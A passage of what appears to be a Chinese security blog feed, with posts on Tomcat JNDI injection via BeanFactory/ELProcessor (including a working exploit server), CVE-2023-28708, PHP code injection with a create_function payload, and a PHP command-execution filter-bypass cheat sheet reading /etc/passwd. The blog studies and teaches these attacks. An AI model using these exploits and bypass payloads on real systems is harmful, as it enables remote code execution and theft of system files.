class="line">                                valueArray[<span class="number">0</span>] = Long.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Float.class)</span><br><span class="line">                                       || propType.equals(<span class="type">float</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Float.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Double.class)</span><br><span class="line">                                       || propType.equals(<span class="type">double</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Double.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> <span class="keyword">if</span> (propType.equals(Boolean.class)</span><br><span class="line">                                       || propType.equals(<span class="type">boolean</span>.class)) &#123;</span><br><span class="line">                                valueArray[<span class="number">0</span>] = Boolean.valueOf(value);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                    (<span class="string">&quot;String conversion for property &quot;</span> + propName +</span><br><span class="line">                                     <span class="string">&quot; of type &#x27;&quot;</span> + propType.getName() +</span><br><span class="line">                                     <span class="string">&quot;&#x27; not available&quot;</span>);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="type">Method</span> <span class="variable">setProp</span> <span class="operator">=</span> pda[i].getWriteMethod();</span><br><span class="line">                            <span class="keyword">if</span> (setProp != <span class="literal">null</span>) &#123;</span><br><span class="line">                                setProp.invoke(bean, valueArray);</span><br><span class="line">                            &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                                <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                                    (<span class="string">&quot;Write not allowed for property: &quot;</span></span><br><span class="line">                                     + propName);</span><br><span class="line">                            &#125;</span><br><span class="line"></span><br><span class="line">                            <span class="keyword">break</span>;</span><br><span class="line"></span><br><span class="line">                        &#125;</span><br><span class="line"></span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (i == pda.length) &#123;</span><br><span class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> <span class="title class_">NamingException</span></span><br><span class="line">                            (<span class="string">&quot;No set method found for property: &quot;</span> + propName);</span><br><span class="line">                    &#125;</span><br><span class="line"></span><br><span class="line">                &#125;</span><br><span class="line"></span><br><span class="line">                <span class="keyword">return</span> bean;</span><br><span class="line"></span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.beans.IntrospectionException ie) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ie.getMessage());</span><br><span class="line">                ne.setRootCause(ie);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.IllegalAccessException iae) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(iae.getMessage());</span><br><span class="line">                ne.setRootCause(iae);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.InstantiationException ie2) &#123;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ie2.getMessage());</span><br><span class="line">                ne.setRootCause(ie2);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125; <span class="keyword">catch</span> (java.lang.reflect.InvocationTargetException ite) &#123;</span><br><span class="line">                <span class="type">Throwable</span> <span class="variable">cause</span> <span class="operator">=</span> ite.getCause();</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> ThreadDeath) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (ThreadDeath) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="keyword">if</span> (cause <span class="keyword">instanceof</span> VirtualMachineError) &#123;</span><br><span class="line">                    <span class="keyword">throw</span> (VirtualMachineError) cause;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="type">NamingException</span> <span class="variable">ne</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">NamingException</span>(ite.getMessage());</span><br><span class="line">                ne.setRootCause(ite);</span><br><span class="line">                <span class="keyword">throw</span> ne;</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>该函数接受三个重要参数，一个是我们从注册中心远程获取的Ref对新娘，一个是我们JNDI查询的name，一个是我们注册中心的上下文registryContext<br>该方法首先判断我么的方法是否是ResourceRef的实例对象，按照我们上一篇文章的恶意类来说，我们的Ref对象是Reference的实例对象而Reference是一个接口并没有集成其他的类，那么如果还是直接使用Reference实例的haul就不满足这个条件，代码直接就结束了，所以这里我们首先得保证我们远程注册的对象是ResourceRef的实例，那么我们之家渠道ResourceRef这个类看看<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f47ba10d795bcb3cf11226abc689cc2a.png" alt="在这里插入图片描述"><br>注意到该类继承了Reference类，那么我们注册的远程Reference对象也可以是ResourceRef的实例对象。这就解决了第一个问题。<br>在org.apache.naming.factory.BeanFactory#getObjectInstance方法第124行会调用一次ResourceRef的getClassname方法，我们直接看这个方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/7b1e710c4915c225612fa91a1396f078.png" alt="在这里插入图片描述"><br>直接放回了变量className，我们看看怎么赋值的<br><img src="https://i-blog.csdnimg.cn/blog_migrate/f030fd29eb22fcdcee31bf199bb96345.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/29e4acb45cff84557ab951a2911e0c3b.png" alt="在这里插入图片描述"></p>
<p>Reference实例化的时候通过有参构造方法赋值的，那么我们在构造远程对象的时候并没有显式得构造Reference对象，所以其赋值来自于ResourceRef类实例化过程中<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73479ec92550904a42086ab6b03bc276.png" alt="在这里插入图片描述"><br>第105行调用了父类的构造方法，也就是如果我们传入7个参数对ResourceRef进行实例化，便会调用到Refernce的实例化过程，且第一个参数就是getClass最终返回的类名。然后就是根据该类名使用反射机制实例化该类，也就是说该类也应该是Client存在的类。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/772102d147ee1b3f1b0d32d9808a0c6a.png" alt="在这里插入图片描述"><br>然后重点来到第151行，这里调用ref对象的get方法，传入字符串forceString，最终返回的是一个RefAddr对象，我们重点关注一下这个方法。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/ef07bb3c97d99dcf0945ccf8d8c008c4.png" alt="在这里插入图片描述"><br>这里有一个重要的对象addrs<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5254d6131c287c3c938ed160c7247b82.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/eaac54745dbc65122cb7a88b87c09a7c.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9fd25159df16cd17b8187ced78003933.png" alt="在这里插入图片描述"><br>其实就是一个列表，其中存的数据类型为RefAddr对象，所以上面调用了其size方法获取了列表的大小，所以get方法的逻辑也就清楚了，遍历列表中的每一个元素调用其getType方法获取到type然后与我们传入的字符串比较，如果相等则返回该RefAddr对象<br>那么这个RefAddr对象可以通过什么方式添加呢？我在Reference类中找到了<br><img src="https://i-blog.csdnimg.cn/blog_migrate/411976e38790da4284fc370c4b456ef5.png" alt="在这里插入图片描述"><br>那么再ResourceRef类中同样可以通过一样的方式添加，我们只需调用add方法，传入RefAddr对象就可以了。回到BeanFactory类，这里调用完get方法后，获得了RefAddr类型的变量，然后调用了其getContent方法，我们又来看看这个方法干了啥。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/9f95756433c5f86659349b4937aaf350.png" alt="在这里插入图片描述"><br>我们发现这是一个抽象类，没有具体的实现，所以我们使用快捷键ctrl+alt+b找一个实现类<br><img src="https://i-blog.csdnimg.cn/blog_migrate/d5c8e3a00edcd7ba2e4326ea5633c61d.png" alt="在这里插入图片描述"><br>这里contents来自于StringRefAddr初始化的时候传入的变量addr，注意到还有一个变量addrType通过其父类传入<br><img src="https://i-blog.csdnimg.cn/blog_migrate/5aa8b1a6f8b49ec231f86ff22878e2af.png" alt="在这里插入图片描述"><br>这个时候我们可以构建一个StringRefAddr对象 new StringRefAddr(“addrType”, “addr”)，这一部分可以总结一下，创建一个ResourceRef对象，然后调用其add方法可以传入一个StringRefAddr对象，也就是</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;ResourceClass&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;addr&quot;</span>));</span><br></pre></td></tr></table></figure>
<p>在执行完getContent方法后会返回一个字符串也就是上面提到的addr，赋值给value，然后通过<code>,</code>分割后循环处理每一部分。针对每一部分通过<code>=</code>分割，等号前面的部分赋值给param,等号后面的部分赋值给setterName，然后以setterName作为方法名利用反射的方式获取上面提到的Class对象对应的Method对象，注意到该方法只能接受一个String类型的参数，然后讲该Method方法作为值，param作为键存入一个HashMap 变量名forced。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/73332102770d06d4aead448b40f719c1.png" alt="在这里插入图片描述"></p>
<p>然后会调用ResourceRef#getAll方法获取实例化过程中传入的所有参数并存入枚举类型中。然后一个一个的迭代获取其addrType，直到其不等于scope、factory、auth、singleton、forceString之后进入下面的步骤，假设我们在调用ResourceRef的add方法时后设置了一个addrType，为a也就是new ResourceRef().add(new StringAddrRef(“a”, “地址类型”))，在202行就会调用StringRefAddr的getContents方法获取到“地址类型”赋值给value。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/20d1e2db09bcb6f00b50cc595f6c71cf.png" alt="在这里插入图片描述"><br>然后再低207行从上面forced这个HashMap中取出a对应的Method，然后利用反射机制调用该Method的invoke方法将封装成数组的value作为参数践行调用。那么如果我找到一个本地Class，然后其有一个方法可以进行任意命令执行岂不美滋滋。。。<br>这个类就是<code>javax.el.ELProcessor</code><br><img src="https://i-blog.csdnimg.cn/blog_migrate/9969d2f67ba634f2acd3a466363aa733.png" alt="在这里插入图片描述"><br>使用其eval方法即可执行任意命令。所以我们的服务端写法也就出来了</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">package</span> com.armandhe.jnditest;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.AlreadyBoundException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.RemoteException;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> RemoteException, NamingException, MalformedURLException, AlreadyBoundException &#123;</span><br><span class="line">        <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1099</span>);</span><br><span class="line">        <span class="type">ResourceRef</span> <span class="variable">resourceRef</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.el.ELProcessor&quot;</span>, <span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, <span class="literal">null</span>);</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=eval&quot;</span>));</span><br><span class="line">        resourceRef.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;)&quot;</span>));</span><br><span class="line">        <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(resourceRef);</span><br><span class="line">        registry.bind(<span class="string">&quot;el&quot;</span>, referenceWrapper);</span><br><span class="line">        System.out.println(<span class="string">&quot;rmi://127.0.0.1/el is working&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>
<p>这样就不需要在客户端设置<code>System.setProperty(“com.sun.jndi.rmi.object.trustURLCodebase”, “true”);</code>了</p>
]]></content>
      <categories>
        <category>漏洞利用</category>
      </categories>
      <tags>
        <tag>tomcat</tag>
        <tag>codebase</tag>
        <tag>JDK</tag>
        <tag>JNDI注入</tag>
      </tags>
  </entry>
  <entry>
    <title>CVE-2023-28708 原理剖析</title>
    <url>/archives/5c78cf2.html</url>
    <content><![CDATA[<p>这应该不是一个严重的漏洞，可能评分只能为低，因为并没有什么卵用。<br>话不多说，直接进入正题</p>
<p>我的复现环境：<br>tomcat-8.5.50</p>
<p>首先我们得简单写一个servlet，当然不写也没事，因为我们的分析到不了处理servlet这一步，只用tomcat默认提供的ROOT就行</p>
<p>首先我们需要在web.xml中注册 RemoteIpFilter 这个过滤器</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>remote-ip-filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>org.apache.catalina.filters.RemoteIpFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>remote-ip-filter<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">url-pattern</span>&gt;</span>/*<span class="tag">&lt;/<span class="name">url-pattern</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>然后把tomcat启动起来，打断点调试，因为问题是出在<code>X-Forwarded-Proto</code>这个HTTP标头，我们就在<code>RemoteIpFilter</code>这个文件中搜索该关键字<br><img src="https://i-blog.csdnimg.cn/blog_migrate/8fccc156174026ce6ffe38387554d8d2.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/1a0a9c8269fc8630579509ed1a647dbf.png" alt="在这里插入图片描述"><br><img src="https://i-blog.csdnimg.cn/blog_migrate/6aac723742f1e1fbfe535979647d4d61.png" alt="在这里插入图片描述"><br>如果获取到<code>X-Forwarded-Proto</code> 并且其值为https就设置Secure属性为True，这个属性最终就体现在cookie上，我们假设一种情况，当反代服务器与提供服务的服务器之间使用http通信时会发生什么，因为反代服务器设置了<code>X-Forwarded-Proto: https</code>，服务提供者会将请求的secure属性设置为True导致被设置了secure的cookie被通过http传输，从而使的cookie存在被劫持的可能。<br><img src="https://i-blog.csdnimg.cn/blog_migrate/69bd4dbb8fa769e97a28745b0cbffeaf.png" alt="在这里插入图片描述"><br>这几乎就是这个漏洞的全部<br>我们看看官方的修复commit<br><a href="https://github.com/apache/tomcat/commit/c64d496dda1560b5df113be55fbfaefec349b50f#diff-9c316c073cfa58d2e1d10f6b11760fbd2c14e478376c92b36e10a21235bb449bR766">Fix BZ 66471 - JSessionId secure attribute missing with RemoteIpFilte…</a></p>
<p>老实说他这个修复方法我没太看懂<br>修改了<code>setSecure</code>方法，获取了<code>request</code>对象，修改后获取的<code>request</code>应该和修改前不一样，修改前获取的是<code>XForwardedRequest</code>对象，修改后应该是原始的<code>ServletRequest</code>对象，所以这里设置<code>secure</code>属性并没有修改到<code>XRequest</code>对象的secure值，所以并不会对转发请求造成影响，从而完成修复<br><img src="https://i-blog.csdnimg.cn/blog_migrate/fcb4252b0f33f77a916761385b40ee35.png" alt="在这里插入图片描述"></p>
<p>在该commit里还加了一个测试用例<br><img src="https://i-blog.csdnimg.cn/blog_migrate/e14900826002dd9dd055128cd6a96538.png" alt="在这里插入图片描述"><br>如果能对该测试用例有足够的理解，理解该漏洞应该不难</p>
]]></content>
      <categories>
        <category>漏洞分析</category>
      </categories>
      <tags>
        <tag>CVE-2023-28708</tag>
        <tag>tomcat</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP代码执行</title>
    <url>/archives/d5b96b72.html</url>
    <content><![CDATA[<h1 id="PHP-CODE-INJECTION"><a href="#PHP-CODE-INJECTION" class="headerlink" title="PHP CODE INJECTION"></a>PHP CODE INJECTION</h1><p>可以注入PHP代码直接执行的漏洞</p>
<p>一般都是后台使用了eval 函数，将我们的输入直接作为eval函数的参数，从而是的恶意的命令被执行</p>
<h2 id="create-function"><a href="#create-function" class="headerlink" title="create_function"></a>create_function</h2><p>create会创建一个匿名函数，第一个参数是传入的参数，第二个参数是函数体</p>
<p><code>create_function(args,code)</code> 返回回个函数名字符串</p>
<p>如</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$newfunc</span> = <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a,$b&#x27;</span>, <span class="string">&#x27;return &quot;ln($a) + ln($b) = &quot; . log($a * $b);</span></span><br></pre></td></tr></table></figure>

<p>函数的执行过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">newfunc</span>(<span class="params"></span>)</span>&#123;    </span><br><span class="line">	<span class="keyword">return</span> <span class="string">&quot;ln(<span class="subst">$a</span>) + ln(<span class="subst">$b</span>) = &quot;</span> . <span class="title function_ invoke__">log</span>(<span class="variable">$a</span> * <span class="variable">$b</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>**案例一：**漏洞代码</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line">	<span class="variable">$sort_by</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;sort_by&#x27;</span>];</span><br><span class="line">	<span class="variable">$sorter</span> = <span class="string">&#x27;strnatcasecmp&#x27;</span>;</span><br><span class="line">	<span class="variable">$databases</span>=<span class="keyword">array</span>(<span class="string">&#x27;1234&#x27;</span>,<span class="string">&#x27;4321&#x27;</span>);</span><br><span class="line">	<span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;], $b[&quot;&#x27;</span> . <span class="variable">$sort_by</span> . <span class="string">&#x27;&quot;]);&#x27;</span>;</span><br><span class="line">	<span class="title function_ invoke__">usort</span>(<span class="variable">$databases</span>, <span class="title function_ invoke__">create_function</span>(<span class="string">&#x27;$a, $b&#x27;</span>, <span class="variable">$sort_function</span>));</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<p>payload</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line">http:<span class="comment">//localhost/test1.php?sort_by=%27%22]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p>还原执行过程</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$sort_function</span> = <span class="string">&#x27; return 1 * &#x27;</span> . <span class="variable">$sorter</span> . <span class="string">&#x27;($a[&quot;&#x27;</span> . <span class="variable">$sort_by</span> <span class="string">&#x27;&quot;]);&#125;phpinfo();/*</span></span><br></pre></td></tr></table></figure>

<p>匿名函数执行</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">niming</span>(<span class="params"><span class="variable">$a</span>,<span class="variable">$b</span></span>)</span>&#123;</span><br><span class="line">	<span class="keyword">return</span> <span class="number">1</span> * <span class="string">&#x27; . $sorter . &#x27;</span>(<span class="variable">$a</span>[<span class="string">&quot;&#x27; . <span class="subst">$sort_by</span> &#x27;&quot;</span>]);&#125;<span class="title function_ invoke__">phpinfo</span>();<span class="comment">/*	</span></span><br><span class="line"><span class="comment">&#125;</span></span><br></pre></td></tr></table></figure>

<h2 id="call-user-func"><a href="#call-user-func" class="headerlink" title="call_user_func"></a>call_user_func</h2><p><code>call_user_func(yourfunc,yourargs)</code> &#x2F;&#x2F;将参数传入函数，可传多个</p>
<h2 id="call-user-func-array"><a href="#call-user-func-array" class="headerlink" title="call_user_func_array"></a>call_user_func_array</h2><p><code>call_user_func_array(yourfunc,yourargsarray)</code> &#x2F;&#x2F;将索引数组的元素作为函数的参数</p>
<h2 id="assert"><a href="#assert" class="headerlink" title="assert"></a>assert</h2><h2 id="eval"><a href="#eval" class="headerlink" title="eval"></a>eval</h2><h2 id="system"><a href="#system" class="headerlink" title="system"></a>system</h2><p>array_map</p>
<p>array_filter</p>
<p>array_walk</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>代码执行</tag>
      </tags>
  </entry>
  <entry>
    <title>PHP命令执行</title>
    <url>/archives/96914696.html</url>
    <content><![CDATA[<h1 id="RCE漏洞"><a href="#RCE漏洞" class="headerlink" title="RCE漏洞"></a>RCE漏洞</h1><p>服务器提供了执行有限命令的权限，但是没有对用户上传的参数做严格过滤，于是可通过一些手段执行多条命令</p>
<h2 id="命令执行函数"><a href="#命令执行函数" class="headerlink" title="命令执行函数"></a>命令执行函数</h2><p>exec() &#x2F;&#x2F;必须使用echo输出，只输出最后一行</p>
<p>shell_exec() &#x2F;&#x2F;必须使用echo输出</p>
<p>system()</p>
<p>popen()</p>
<p>反单引号 必须echo</p>
<p>obstart</p>
<p>mail+LD_RELOAD</p>
<p>proc_open</p>
<p>passthru</p>
<p>xss中可以使用&#96;&#96;代替括号 alert<code>123</code></p>
<p>sql注入诸如中可以使用&#96;&#96;select<code>$_GET[name]</code> from table</p>
<h2 id="执行方式"><a href="#执行方式" class="headerlink" title="执行方式"></a>执行方式</h2><h3 id="windows"><a href="#windows" class="headerlink" title="windows:"></a>windows:</h3><p>| 不断路</p>
<p>|| 短路</p>
<p>&amp;&amp; 短路</p>
<p>&amp; 不断路</p>
<h3 id="linux"><a href="#linux" class="headerlink" title="linux"></a>linux</h3><p>; 分割不同的命令</p>
<h2 id="过滤函数"><a href="#过滤函数" class="headerlink" title="过滤函数"></a>过滤函数</h2><p>shell_code</p>
<h2 id="绕过姿势"><a href="#绕过姿势" class="headerlink" title="绕过姿势"></a>绕过姿势</h2><p><strong>关键字过滤</strong></p>
<p>使用反斜线、单引号、变量拼接、base64编码</p>
<p><code>ca\t$IFS/etc/passw&#39;o&#39;r\d</code> &#x2F;&#x2F;能正常执行 必须跟绝对路劲</p>
<p><code>a=&#39;l&#39;;b=&#39;s&#39;;$a$b</code></p>
<p><code>echo d2hvYW1p | base64 -d</code> &#x2F;&#x2F;base64</p>
<p><code>echo &quot;0x636174202f6574632f706173737764&quot; | xxd -r -p | bash</code> &#x2F;&#x2F;十六进制</p>
<p><code>$(printf &quot;\x63\x61\x74\x20\x2f\x65\x74\x63\x2f\x70\x61\x73\x73\x77\x64&quot;)</code> &#x2F;&#x2F;十六进制</p>
<p><em>k</em> &#x3D; ′<em>dd</em>′;{IFS}${9}{n\l,&#x2F;etc$kkkkkkk$kkkkd&#x2F;pa’s’sddks&#96;&#96;}</p>
<p><strong>文件名过滤绕过</strong></p>
<p>使用通配符</p>
<p><code>cat /???/passw*</code></p>
<p>使用未声明的变量</p>
<p><code>cat /etc$u/passwd</code></p>
<p>使用通配</p>
<p><code>cat /etc/pass[sdfkew]d</code></p>
<p>使用cd命令目录穿越</p>
<p><code>cd+..%26%26cd+..%26%26cd+..%26%26cd+..%26%26cd+etc%26%26cat+passwd</code></p>
<p>windows系统</p>
<p><code>((whoa^m&quot;&quot;i))</code></p>
<p>变量拼接：</p>
<p><code>Whoami = a=who&amp;&amp;b=ami&amp;&amp;$a$b</code></p>
<p>中间件命令执行使用替代函数</p>
<p><code>phpinfo() = chr (80).chr (72).chr (80).chr (73).chr (78).chr (70).chr (79).chr (40).chr (41)</code></p>
<p><code>base_convert(27440799224,10,32)();</code></p>
<p><strong>cat的替代命令</strong>：</p>
<p><code>cat more less head tac nl od vi vim uniq file -f sort bash -v  rev  strings curl file:///etc/passwd</code></p>
<p>find 读取目录</p>
<p><strong>过滤空格绕过</strong></p>
<p><code>$IFS $IFS$9 $&#123;IFS&#125;&#123;cat,/etc/passwd&#125;</code></p>
<p><strong>连接符过滤</strong></p>
<p><code>&amp; | ; %0a</code>等连接符 挨个尝试</p>
]]></content>
      <categories>
        <category>漏洞原理</category>
      </categories>
      <tags>
        <tag>漏洞原理</tag>
        <tag>PHP</tag>
        <tag>命令执行</tag>
      </tags>
  </entry>
  <entry>
    <title>解决hexo图片访问遇到图床防盗链无法访问的问题</title>
    <url>/archives/53e2963.html</url>
    <content><![CDATA[<p>我的<code>hexo</code>使用的时<code>hexo-renderer-marked</code>渲染引擎，在该引擎的<code>lib/renderer.js</code>文件中搜索<code>img</code>关键字  添加标签属性<code>referrerpolicy=&quot;no-referrer&quot;</code>即可</p>
<figure class="highlight js"><table><tr><td class="code"><pre><span class="line"><span class="title function_">image</span>(<span class="params">&#123; href, title, text &#125;</span>) &#123;</span><br><span class="line">    <span class="keyword">const</span> &#123; options &#125; = <span class="variable language_">this</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; hexo &#125; = options;</span><br><span class="line">    <span class="keyword">const</span> &#123; relative_link &#125; = hexo.<span class="property">config</span>;</span><br><span class="line">    <span class="keyword">const</span> &#123; lazyload, figcaption, prependRoot, postPath &#125; = options;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (!<span class="regexp">/^(#|\/\/|http(s)?:)/</span>.<span class="title function_">test</span>(href) &amp;&amp; !relative_link &amp;&amp; prependRoot) &#123;</span><br><span class="line">      <span class="keyword">if</span> (!href.<span class="title function_">startsWith</span>(<span class="string">&#x27;/&#x27;</span>) &amp;&amp; !href.<span class="title function_">startsWith</span>(<span class="string">&#x27;\\&#x27;</span>) &amp;&amp; postPath) &#123;</span><br><span class="line">        <span class="keyword">const</span> <span class="title class_">PostAsset</span> = hexo.<span class="title function_">model</span>(<span class="string">&#x27;PostAsset&#x27;</span>);</span><br><span class="line">        <span class="comment">// findById requires forward slash</span></span><br><span class="line">        <span class="keyword">const</span> asset = <span class="title class_">PostAsset</span>.<span class="title function_">findById</span>(<span class="title function_">join</span>(postPath, href.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>)));</span><br><span class="line">        <span class="comment">// asset.path is backward slash in Windows</span></span><br><span class="line">        <span class="keyword">if</span> (asset) href = asset.<span class="property">path</span>.<span class="title function_">replace</span>(<span class="regexp">/\\/g</span>, <span class="string">&#x27;/&#x27;</span>);</span><br><span class="line">      &#125;</span><br><span class="line">      href = url_for.<span class="title function_">call</span>(hexo, href);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">let</span> out = <span class="string">`&lt;img src=&quot;<span class="subst">$&#123;encodeURL(href)&#125;</span>&quot; referrerpolicy=&quot;no-referrer&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (text) out += <span class="string">` alt=&quot;<span class="subst">$&#123;<span class="built_in">escape</span>(text)&#125;</span>&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (title) out += <span class="string">` title=&quot;<span class="subst">$&#123;<span class="built_in">escape</span>(title)&#125;</span>&quot;`</span>;</span><br><span class="line">    <span class="keyword">if</span> (lazyload) out += <span class="string">&#x27; loading=&quot;lazy&quot;&#x27;</span>;</span><br><span class="line"></span><br><span class="line">    out += <span class="string">&#x27;&gt;&#x27;</span>;</span><br><span class="line">    <span class="keyword">if</span> (figcaption &amp;&amp; text) &#123;</span><br><span class="line">      <span class="keyword">return</span> <span class="string">`&lt;figure&gt;<span class="subst">$&#123;out&#125;</span>&lt;figcaption aria-hidden=&quot;true&quot;&gt;<span 